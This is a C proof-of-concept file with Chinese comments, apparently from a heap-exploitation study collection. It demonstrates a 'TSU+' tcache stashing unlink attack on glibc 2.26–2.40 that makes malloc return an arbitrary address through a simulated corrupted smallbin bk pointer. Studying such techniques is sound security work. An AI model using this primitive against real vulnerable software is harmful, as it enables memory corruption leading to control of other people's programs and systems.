/*
 * 手法：增强版 tcache 暂存解链攻击（TSU+）。
 * 适用：glibc 2.26～2.40；2.41 起 smallbin→tcache 流程已重构。
 *
 * 漏洞模型：UAF/越界写，可修改一个已经进入 smallbin 的 chunk->bk。
 * 效果：把任意对齐地址挂进 tcache，下一次 malloc 返回该地址。
 *
 * 与标准 TSU 的区别：标准版通常强调 bck->fd 的 libc 地址写；TSU+
 * 则让 stashing 循环继续经过伪节点，从而直接得到 target chunk。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    /* target 必须 0x10 对齐，否则高版本 tcache_get 会因对齐检查退出。 */
    __attribute__((aligned(16))) size_t target[4] = {0};
    size_t *chunks[9];
    size_t *result;

    setbuf(stdout, NULL);

    /* 前 7 个最终填满 0x110 tcache；第 8、9 个进入 unsorted，
     * fence chunk 阻止 chunks[7] 与 chunks[8] 相邻合并。
     */
    for (int i = 0; i < 8; ++i)
        chunks[i] = malloc(0x100);
    (void)malloc(0x20);
    chunks[8] = malloc(0x100);
    (void)malloc(0x20);              /* 阻止最后一块与 top 合并 */

    for (int i = 0; i < 9; ++i)
        free(chunks[i]);

    /* 不能由 0x110 tcache 满足的大请求会把两个 unsorted chunk 排入
     * 0x110 smallbin。随后取走两个 tcache chunk，只留下 5 个槽位。
     */
    (void)malloc(0x200);
    (void)malloc(0x100);
    (void)malloc(0x100);

    /* 漏洞模拟：
     *   victim->bk = fake_chunk_header = target - 0x10
     * stashing 还会执行 bck->fd = bin，所以 target+8（fake->bk）必须
     * 指向一块可写区域；这里让它指回 target 自身。
     */
    chunks[8][1] = (size_t)target - 0x10;
    target[1] = (size_t)target;

    /* calloc 在这一版本窗口不直接从 tcache 取块，因此进入 smallbin
     * 精确尺寸分支并触发 stashing。2.41 后这一旧循环已不存在。
     */
    (void)calloc(1, 0x100);
    result = malloc(0x100);

    printf("[+] TSU+：结果=%p，目标=%p\n",
           (void *)result, (void *)target);
    assert(result == target);
    return 0;
}
